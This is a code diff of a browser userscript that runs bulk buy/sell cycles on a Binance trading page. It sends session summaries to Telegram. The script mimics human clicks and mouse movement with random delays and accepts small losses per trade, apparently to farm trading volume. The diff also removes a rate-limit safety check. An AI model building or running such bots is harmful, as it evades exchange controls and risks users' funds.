+                        if (usdValue > 0.5) {
+                            log(`⚠ Holding ${tokenName}: $${usdValue} (> $0.5), executing sell...`);
+                            statusEl.textContent = `Trade ${i + 1}: Selling holdings...`;
+                            const openOrdersTab = document.querySelector('#bn-tab-orderOrder > div:nth-child(1)');
+                            if (openOrdersTab) openOrdersTab.click();
+                            await new Promise(r => setTimeout(r, 500));
+                            
+                            // Cancel all existing orders first
+                            const cancelAllBtn = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div/div[3]/div/div/div[1]/table/thead/tr/th[9]/div');
+                            if (cancelAllBtn) {
+                                log('Canceling existing orders...');
+                                humanClick(cancelAllBtn);
+                                await new Promise(r => setTimeout(r, 500));
+                                await clickCancelConfirmWithRetry();
+                                await new Promise(r => setTimeout(r, 1000));
+                            }
+                            
+                            await cleanupStuckSellOrder();
+                            await new Promise(r => setTimeout(r, 2000));
+                            balanceBeforeTrade = window.currentBalance;
+                            continue;
+                        }
+                    }
+                }
+                
+                // Switch back to Open Orders
+                const openOrdersTab = document.querySelector('#bn-tab-orderOrder > div:nth-child(1)');
+                if (openOrdersTab) openOrdersTab.click();
+                await new Promise(r => setTimeout(r, 500));
+                
+                // Check Open Orders - no orders for current token
+                const orderSection = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div');
+                if (orderSection) {
+                    const orderText = orderSection.textContent;
+                    if (orderText.includes(tokenName) && (orderText.includes('Buy') || orderText.includes('Sell'))) {
+                        log(`⚠ Open orders exist for ${tokenName}, skipping trade`);
+                        statusEl.textContent = `Trade ${i + 1}: Open orders exist, skipping`;
+                        await new Promise(r => setTimeout(r, 2000));
+                        continue;
+                    }
+                }
+                
+                log('✓ Prerequisites passed');
+                
                 // Safety checks with debug logging
                 const maxLossCheck = checkMaxLoss();
-                const rateLimitCheck = checkRateLimit();
-                console.log(`Safety checks - MaxLoss: ${maxLossCheck}, RateLimit: ${rateLimitCheck}`);
+                console.log(`Safety checks - MaxLoss: ${maxLossCheck}`);
                 
                 if (!maxLossCheck) {
                     statusEl.textContent = 'STOPPED: Max loss limit reached!';
@@ -638,22 +1010,17 @@
                     break;
                 }
                 
-                if (!rateLimitCheck) {
-                    statusEl.textContent = 'STOPPED: Rate limit reached (wait 1 hour)';
-                    statusEl.style.color = '#FF0000';
-                    console.log('Stopped due to rate limit');
-                    break;
-                }
+
                 
                 statusEl.textContent = `Trade ${i + 1}/${tradesCount}: Calculating...`;
                 statusEl.style.color = '#FFD700';
                 
                 // Fresh price calculation
                 const prices = calculateOptimalPrices();
-                console.log('Calculated prices:', prices);
+                log(`Buy: ${prices.buy} | Sell: ${prices.sell} | Loss: ${prices.loss}%`);
                 if (!prices) {
                     statusEl.textContent = `Trade ${i + 1}/${tradesCount}: Price error`;
-                    console.log('Price calculation failed');
+                    log('❌ Price calculation failed');
                     await new Promise(r => setTimeout(r, 2000));
                     continue;
                 }
@@ -669,11 +1036,8 @@
                     break;
                 }
                 
-                const feeUSDT = getTradingFeeUSDT(parseFloat(prices.market));
-                const lossUSDT = (amount * parseFloat(prices.loss) / 100 + feeUSDT).toFixed(6);
-                const totalLossSoFar = getTotalLossFromStorage();
-                
-                totalLossEl.textContent = `Total Loss: ${totalLossSoFar.toFixed(6)} USDT | This: ${lossUSDT} USDT`;
+                // Store balance before trade
+                balanceBeforeTrade = window.currentBalance;
                 
                 // Ensure sell price field is visible before proceeding
                 if (!ensureSellPriceFieldVisible()) {
@@ -708,10 +1072,25 @@
                     setReactValue(sellPriceInput, prices.sell);
                     await new Promise(r => setTimeout(r, 100));
                     
-                    // Verify sell price was set correctly
+                    // Verify sell price was set correctly (retry up to 3 times)
+                    for (let retry = 0; retry < 3; retry++) {
+                        if (sellPriceInput.value !== prices.sell) {
+                            log(`Retry ${retry + 1}: Setting sell price ${prices.sell}`);
+                            setReactValue(sellPriceInput, prices.sell);
+                            await new Promise(r => setTimeout(r, 150));
+                        } else {
+                            log(`✓ Sell price confirmed: ${prices.sell}`);
+                            break;
+                        }
+                    }
+                    
+                    // Final verification
                     if (sellPriceInput.value !== prices.sell) {
-                        setReactValue(sellPriceInput, prices.sell);
-                        await new Promise(r => setTimeout(r, 100));
+                        log(`❌ FAILED to set sell price! Expected: ${prices.sell}, Got: ${sellPriceInput.value}`);
+                        statusEl.textContent = 'ERROR: Sell price not set!';
+                        statusEl.style.color = '#FF0000';
+                        await new Promise(r => setTimeout(r, 3000));
+                        continue; // Skip this trade
                     }
                     
                     simulateMouseMove(buyButton);
@@ -723,9 +1102,26 @@
                     // Wait 2 seconds after confirmation for order processing
                     await new Promise(r => setTimeout(r, 2000));
                     
-                    // Wait for trade completion
-                    statusEl.textContent = `Trade ${i + 1}/${tradesCount}: Waiting...`;
-                    const result = await waitForTradeCompletion();
+                    // Wait for trade completion with price movement detection
+                    const entryPrice = parseFloat(prices.buy);
+                    
+                    // Show live status during wait
+                    const waitInterval = setInterval(() => {
+                        const orderSection = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div');
+                        if (orderSection) {
+                            const orderText = orderSection.textContent;
+                            if (orderText.includes('Buy') && orderText.includes('Sell')) {
+                                statusEl.textContent = `Trade ${i + 1}/${tradesCount}: Buy+Sell active`;
+                            } else if (orderText.includes('Buy')) {
+                                statusEl.textContent = `Trade ${i + 1}/${tradesCount}: Buy filling...`;
+                            } else if (orderText.includes('Sell')) {
+                                statusEl.textContent = `Trade ${i + 1}/${tradesCount}: Sell filling...`;
+                            }
+                        }
+                    }, 500);
+                    
+                    const result = await waitForTradeCompletion(entryPrice);
+                    clearInterval(waitInterval);
                     
                     // Get actual fill prices for slippage check
                     const actualBuyPrice = parseFloat(prices.buy);
@@ -739,29 +1135,50 @@
                         statusEl.textContent = `Trade ${i + 1}/${tradesCount}: ${result}`;
                     }
                     
-                    // Save trade data
-                    const tradeData = {
-                        timestamp: new Date().toISOString(),
-                        tradeNumber: i + 1,
-                        buyPrice: prices.buy,
-                        sellPrice: prices.sell,
-                        amount: amount,
-                        lossPercent: prices.loss,
-                        feeUSDT: feeUSDT.toFixed(6),
-                        lossUSDT: lossUSDT,
-                        result: result,
-                        slippage: slippage.toFixed(3)
-                    };
-                    saveTradeToStorage(tradeData);
-                    
-                    // Random delay after successful trade
+                    // Only calculate loss and save if trade completed successfully (not cleanup)
                     if (result === 'completed') {
-                        const maxDelay = parseInt(document.getElementById('trade-delay')?.value) || 4;
+                        // Calculate actual loss from balance delta
+                        await new Promise(r => setTimeout(r, 1000)); // Wait for balance update
+                        const balanceAfterTrade = window.currentBalance;
+                        const actualLoss = balanceBeforeTrade - balanceAfterTrade;
+                        
+                        // Save trade data
+                        const tradeData = {
+                            timestamp: new Date().toISOString(),
+                            tradeNumber: completedTradesCount + 1,
+                            buyPrice: prices.buy,
+                            sellPrice: prices.sell,
+                            amount: amount,
+                            lossPercent: prices.loss,
+                            actualLoss: actualLoss.toFixed(6),
+                            result: result,
+                            slippage: slippage.toFixed(3)
+                        };
+                        saveTradeToStorage(tradeData);
+                        localStorage.removeItem('manualLossAdjustment'); // Clear manual override
+                        completedTradesCount++;
+                        sessionVolume += amount;
+                        log(`✓ Trade #${completedTradesCount} completed, Loss: ${actualLoss.toFixed(6)} USDT`);
+                        
+                        // Update Total Loss display immediately
+                        const totalLossEl = document.getElementById('total-loss-display');
+                        if (totalLossEl) {
+                            totalLossEl.textContent = getTotalLossFromStorage().toFixed(6);
+                        }
+                    } else {
+                        log(`⚠ Trade cancelled/failed: ${result}`);
+                    }
+                    
+                    // Delay after trade regardless of result
+                    if (result === 'completed') {
+                        const maxDelay = parseInt(document.getElementById('trade-delay')?.value) || 2;
                         const delay = 1000 + Math.random() * (maxDelay - 1) * 1000;
                         statusEl.textContent = `Trade ${i + 1}/${tradesCount}: Waiting ${(delay/1000).toFixed(1)}s...`;
                         await new Promise(r => setTimeout(r, delay));
                     } else {
-                        await new Promise(r => setTimeout(r, 500));
+                        // Wait longer after cancellation to ensure UI is ready
+                        log('Waiting 2s after cancellation...');
+                        await new Promise(r => setTimeout(r, 2000));
                     }
                 }
             }
@@ -771,9 +1188,75 @@
             statusEl.style.color = '#4CAF50';
             startBtn.style.display = 'inline-block';
             pauseBtn.style.display = 'none';
+            document.getElementById('bulk-stop').style.display = 'none';
+            
+            // Send Telegram notification if any trades completed
+            console.log('Checking Telegram notification conditions:', { isExecuting, completedTradesCount });
+            if (isExecuting && completedTradesCount > 0) {
+                const nickname = localStorage.getItem('traderNickname') || 'Trader';
+                const trades = JSON.parse(localStorage.getItem('binanceTrades') || '[]');
+                const recentTrades = trades.slice(-completedTradesCount);
+                const cancelledCount = recentTrades.filter(t => t.result === 'cancelled').length;
+                const tradeAmount = parseFloat(document.getElementById('trade-amount').value) || 1;
+                
+                // Get token holdings value
+                const tokenName = getTokenName();
+                const holdingsTab = document.querySelector('#bn-tab-holdings');
+                if (holdingsTab) holdingsTab.click();
+                await new Promise(r => setTimeout(r, 500));
+                
+                let tokenHoldingsValue = 0;
+                const row = Array.from(document.querySelectorAll('table tbody tr')).find(r => r.textContent.includes(tokenName));
+                if (row) {
+                    const valueCell = row.querySelector('td:nth-child(3) .text-TertiaryText');
+                    if (valueCell) {
+                        tokenHoldingsValue = parseFloat(valueCell.textContent.replace(/[^0-9.]/g, '')) || 0;
+                    }
+                }
+                
+                const openOrdersTab = document.querySelector('#bn-tab-orderOrder > div:nth-child(1)');
+                if (openOrdersTab) openOrdersTab.click();
+                await new Promise(r => setTimeout(r, 300));
+                
+                const balanceAfterSession = window.currentBalance + tokenHoldingsValue;
+                const actualSessionLoss = balanceBeforeSession - balanceAfterSession;
+                const percentageChange = ((balanceAfterSession - balanceBeforeSession) / balanceBeforeSession * 100).toFixed(3);
+                const changeEmoji = percentageChange >= 0 ? '📈' : '📉';
+                const detailedReport = document.getElementById('detailed-report').checked;
+                
+                let message = `<b>[${nickname}]</b> - ${new Date().toLocaleString()}\n\n` +
+                    `🤖 <b>Trading Session Completed</b>\n` +
+                    `🪙 Token: ${tokenName}\n\n` +
+                    `📊 Total Trades: ${tradesCount}\n` +
+                    `✅ Completed: ${completedTradesCount}\n` +
+                    `❌ Cancelled: ${cancelledCount}\n` +
+                    `💵 Amount per Trade: ${tradeAmount} USDT\n` +
+                    `📈 Total Volume: ${sessionVolume.toFixed(2)} USDT\n` +
+                    `💰 Session Loss: ${actualSessionLoss.toFixed(6)} USDT\n` +
+                    `📊 Balance Before: ${balanceBeforeSession.toFixed(2)} USDT\n` +
+                    `📊 Balance After: ${balanceAfterSession.toFixed(2)} USDT\n` +
+                    `${changeEmoji} Change: ${percentageChange}%`;
+                
+                if (detailedReport && recentTrades.length > 0) {
+                    message += `\n\n📋 <b>Trade Details:</b>\n`;
+                    recentTrades.forEach((trade, idx) => {
+                        if (trade.result === 'completed') {
+                            message += `\n#${idx + 1}: Loss ${trade.actualLoss} USDT`;
+                        }
+                    });
+                }
+                
+                console.log('Sending Telegram notification...');
+                await sendTelegramMessage(message);
+                console.log('Telegram notification sent successfully');
+            } else {
+                console.log('Skipping Telegram notification - isExecuting:', isExecuting, 'completedTradesCount:', completedTradesCount);
+            }
+            
             isExecuting = false;
             isPaused = false;
             console.log('Bulk trading completed, stopping execution');
+            
             setTimeout(() => {
                 statusEl.textContent = '';
                 statusEl.style.color = '#FFD700';
@@ -782,6 +1265,7 @@
         
         document.getElementById('bulk-start').addEventListener('click', (e) => {
             e.stopPropagation();
+            console.log('Start button clicked');
             executeBulkTrades();
         });
         
@@ -797,6 +1281,89 @@
                     e.target.textContent = 'Resume';
                     e.target.style.background = '#4CAF50';
                 }
+            }
+        });
+        
+        document.getElementById('bulk-stop').addEventListener('click', async (e) => {
+            e.stopPropagation();
+            if (isExecuting) {
+                const statusEl = document.getElementById('bulk-status');
+                const startBtn = document.getElementById('bulk-start');
+                const pauseBtn = document.getElementById('bulk-pause');
+                const stopBtn = document.getElementById('bulk-stop');
+                
+                // Send Telegram notification before stopping
+                if (completedTradesCount > 0) {
+                    const nickname = localStorage.getItem('traderNickname') || 'Trader';
+                    const trades = JSON.parse(localStorage.getItem('binanceTrades') || '[]');
+                    const recentTrades = trades.slice(-completedTradesCount);
+                    const tradeAmount = parseFloat(document.getElementById('trade-amount').value) || 1;
+                    
+                    // Get token holdings value
+                    const tokenName = getTokenName();
+                    const holdingsTab = document.querySelector('#bn-tab-holdings');
+                    if (holdingsTab) holdingsTab.click();
+                    await new Promise(r => setTimeout(r, 500));
+                    
+                    let tokenHoldingsValue = 0;
+                    const row = Array.from(document.querySelectorAll('table tbody tr')).find(r => r.textContent.includes(tokenName));
+                    if (row) {
+                        const valueCell = row.querySelector('td:nth-child(3) .text-TertiaryText');
+                        if (valueCell) {
+                            tokenHoldingsValue = parseFloat(valueCell.textContent.replace(/[^0-9.]/g, '')) || 0;
+                        }
+                    }
+                    
+                    const openOrdersTab = document.querySelector('#bn-tab-orderOrder > div:nth-child(1)');
+                    if (openOrdersTab) openOrdersTab.click();
+                    await new Promise(r => setTimeout(r, 300));
+                    
+                    const balanceAfterSession = window.currentBalance + tokenHoldingsValue;
+                    const actualSessionLoss = balanceBeforeSession - balanceAfterSession;
+                    const percentageChange = ((balanceAfterSession - balanceBeforeSession) / balanceBeforeSession * 100).toFixed(3);
+                    const changeEmoji = percentageChange >= 0 ? '📈' : '📉';
+                    const detailedReport = document.getElementById('detailed-report').checked;
+                    
+                    let message = `<b>[${nickname}]</b> - ${new Date().toLocaleString()}\n\n` +
+                        `⛔ <b>Trading Session STOPPED</b>\n` +
+                        `🪙 Token: ${tokenName}\n\n` +
+                        `📊 Completed Trades: ${completedTradesCount}\n` +
+                        `💵 Amount per Trade: ${tradeAmount} USDT\n` +
+                        `📈 Total Volume: ${sessionVolume.toFixed(2)} USDT\n` +
+                        `💰 Session Loss: ${actualSessionLoss.toFixed(6)} USDT\n` +
+                        `📊 Balance Before: ${balanceBeforeSession.toFixed(2)} USDT\n` +
+                        `📊 Balance After: ${balanceAfterSession.toFixed(2)} USDT\n` +
+                        `${changeEmoji} Change: ${percentageChange}%`;
+                    
+                    if (detailedReport && recentTrades.length > 0) {
+                        message += `\n\n📋 <b>Trade Details:</b>\n`;
+                        recentTrades.forEach((trade, idx) => {
+                            if (trade.result === 'completed') {
+                                message += `\n#${idx + 1}: Loss ${trade.actualLoss} USDT`;
+                            }
+                        });
+                    }
+                    
+                    console.log('Sending Stop notification...');
+                    await sendTelegramMessage(message);
+                    console.log('Stop notification sent successfully');
+                }
+                
+                isExecuting = false;
+                isPaused = false;
+                completedTradesCount = 0;
+                sessionVolume = 0;
+                
+                statusEl.textContent = 'STOPPED by user';
+                statusEl.style.color = '#FF0000';
+                startBtn.style.display = 'inline-block';
+                pauseBtn.style.display = 'none';
+                stopBtn.style.display = 'none';
+                
+                setTimeout(() => {
+                    statusEl.textContent = '';
+                    statusEl.style.color = '#FFD700';
+                }, 3000);
             }
         });
         
@@ -915,6 +1482,32 @@
             return false;
         }
         
+        // Verify token was sold by checking Holdings tab
+        async function verifyTokenSold() {
+            const tokenName = getXPathElement('/html/body/div[4]/div/div[2]/div/div/div[1]/div[3]/div[1]')?.textContent.trim();
+            if (!tokenName) return false;
+            
+            const holdingsTab = document.querySelector('#bn-tab-holdings');
+            if (holdingsTab) holdingsTab.click();
+            await new Promise(r => setTimeout(r, 500));
+            
+            const row = Array.from(document.querySelectorAll('table tbody tr')).find(r => r.textContent.includes(tokenName));
+            let usdValue = 0;
+            if (row) {
+                const valueCell = row.querySelector('td:nth-child(3) .text-TertiaryText');
+                if (valueCell) {
+                    usdValue = parseFloat(valueCell.textContent.replace(/[^0-9.]/g, ''));
+                    log(`${tokenName} remaining value: $${usdValue}`);
+                }
+            }
+            
+            const openOrdersTab = document.querySelector('#bn-tab-orderOrder > div:nth-child(1)');
+            if (openOrdersTab) openOrdersTab.click();
+            await new Promise(r => setTimeout(r, 300));
+            
+            return usdValue < 0.01;
+        }
+        
         // Cleanup stuck sell order by placing aggressive sell
         async function cleanupStuckSellOrder() {
             if (!isExecuting) {
@@ -949,15 +1542,22 @@
             }
             
             // Ensure Reverse Order is unchecked (we want to sell tokens for USDT)
-            const checkboxContainer = document.querySelector('.bn-checkbox.bn-checkbox__square.checked') || 
-                                    document.querySelector('[data-testid="reverse-order-checkbox"].checked') ||
-                                    getXPathElement('/html/body/div[4]/div/div[3]/div/div[9]/div/div/div/div/div[3]/div[5]/div[1]/div[1]/div');
+            const checkboxes = document.querySelectorAll('div[role="checkbox"]');
+            let reverseOrderCheckbox = null;
             
-            if (checkboxContainer) {
-                const checkbox = checkboxContainer.querySelector('input[type="checkbox"]');
-                if (checkbox && checkbox.checked) {
+            for (const checkbox of checkboxes) {
+                const nextSibling = checkbox.nextElementSibling;
+                if (nextSibling && nextSibling.textContent.includes('Reverse Order')) {
+                    reverseOrderCheckbox = checkbox;
+                    break;
+                }
+            }
+            
+            if (reverseOrderCheckbox) {
+                const isChecked = reverseOrderCheckbox.getAttribute('aria-checked') === 'true';
+                if (isChecked) {
                     console.log('Unchecking Reverse Order for token sale');
-                    humanClick(checkboxContainer);
+                    humanClick(reverseOrderCheckbox);
                     await new Promise(r => setTimeout(r, 300));
                 } else {
                     console.log('Reverse Order already unchecked');
@@ -1086,8 +1686,6 @@
                 console.log('Paused due to mouse movement');
                 return;
             }
-            
-            ensureCheckboxChecked();
             
             const buyPrice = document.getElementById('buy-price').textContent;
             const sellPrice = document.getElementById('sell-price').textContent;
@@ -1299,12 +1897,14 @@
                 const priceSpans = Array.from(document.querySelectorAll('span')).filter(s => 
                     /^0\.[0-9]{4,8}$/.test(s.textContent.trim()));
                 
-                console.log('Chart container found:', !!chartContainer);
-                console.log('Close element found:', !!closeEl);
-                console.log('Spans with key attribute:', allKeySpans.length);
-                console.log('Price-like spans found:', priceSpans.length);
-                if (priceSpans.length > 0) {
-                    console.log('Sample price spans:', priceSpans.slice(0, 3).map(s => s.textContent));
+                if (document.getElementById('console-log-enabled')?.checked) {
+                    console.log('Chart container found:', !!chartContainer);
+                    console.log('Close element found:', !!closeEl);
+                    console.log('Spans with key attribute:', allKeySpans.length);
+                    console.log('Price-like spans found:', priceSpans.length);
+                    if (priceSpans.length > 0) {
+                        console.log('Sample price spans:', priceSpans.slice(0, 3).map(s => s.textContent));
+                    }
                 }
             }
             
@@ -1338,23 +1938,10 @@
             
             let buyPrice, sellPrice;
             
-            if (recentBuyPrices.length > 0 && recentSellPrices.length > 0) {
-                // Buy: slightly above highest recent buy (guaranteed fill)
-                const highestBuy = Math.max(...recentBuyPrices);
-                buyPrice = highestBuy * 1.0001; // 0.01% above
-                
-                // Sell: at or below lowest recent sell (guaranteed fill)
-                const lowestSell = Math.min(...recentSellPrices);
-                sellPrice = Math.min(lowestSell * 0.9999, currentPrice * 0.9998); // Ensure below market
-            } else {
-                // Fallback: fixed offsets
-                buyPrice = currentPrice * 1.0003;
-                sellPrice = currentPrice * 0.9997;
-            }
-            
-            // Safety: ensure sell < market < buy
-            if (sellPrice >= currentPrice) sellPrice = currentPrice * 0.9998;
-            if (buyPrice <= currentPrice) buyPrice = currentPrice * 1.0002;
+            // Use tighter spread based on manual trade analysis: 0.06% total spread
+            // Buy slightly below market, Sell slightly above market
+            buyPrice = currentPrice * 0.9997;  // 0.03% below market
+            sellPrice = currentPrice * 1.0003; // 0.03% above market
             
             const lossPercent = ((buyPrice - sellPrice) / buyPrice * 100).toFixed(3);
             const spread = ((buyPrice - sellPrice) / sellPrice * 100).toFixed(4);
@@ -1380,11 +1967,22 @@
                     if (!isNaN(balanceNum)) {
                         window.currentBalance = balanceNum;
                         const balanceSpan = document.getElementById('balance');
-                        if (balanceSpan) balanceSpan.textContent = balanceNum.toFixed(8);
+                        if (balanceSpan) balanceSpan.textContent = balanceNum.toFixed(2);
                     }
                 }
             } catch (e) {
                 console.log('Balance update error:', e);
+            }
+            
+            // Update total loss display
+            try {
+                const totalLossEl = document.getElementById('total-loss-display');
+                if (totalLossEl) {
+                    const totalLoss = getTotalLossFromStorage();
+                    totalLossEl.textContent = totalLoss.toFixed(6);
+                }
+            } catch (e) {
+                console.log('Total loss update error:', e);
             }
             
             try {
@@ -1395,7 +1993,6 @@
                     const buyEl = document.getElementById('buy-price');
                     const sellEl = document.getElementById('sell-price');
                     const lossPercentEl = document.getElementById('loss-percent');
-                    const lossUsdtEl = document.getElementById('loss-usdt');
                     const spreadEl = document.getElementById('spread-info');
                     
                     if (marketEl) marketEl.textContent = prices.market;
@@ -1403,15 +2000,6 @@
                     if (sellEl) sellEl.textContent = prices.sell;
                     if (lossPercentEl) lossPercentEl.textContent = prices.loss + '%';
                     if (spreadEl) spreadEl.textContent = prices.spread + '%';
-                    
-                    // Calculate estimated loss in USDT (including fee)
-                    const amountInput = document.getElementById('trade-amount');
-                    if (amountInput && lossUsdtEl) {
-                        const amount = parseFloat(amountInput.value) || 1;
-                        const feeUSDT = getTradingFeeUSDT(parseFloat(prices.market));
-                        const lossUSDT = (amount * parseFloat(prices.loss) / 100 + feeUSDT).toFixed(6);
-                        lossUsdtEl.textContent = lossUSDT;
-                    }
                 } else {
                     const marketEl = document.getElementById('market-price');
                     if (marketEl) marketEl.textContent = 'No data';
@@ -1423,8 +2011,8 @@
             }
         }
 
-        // Update every 10ms for maximum speed without overwhelming
-        setInterval(updateDisplay, 10);
+        // Update every 100ms for real-time updates
+        setInterval(updateDisplay, 100);
         updateDisplay();
         
         // Force initial chart hover
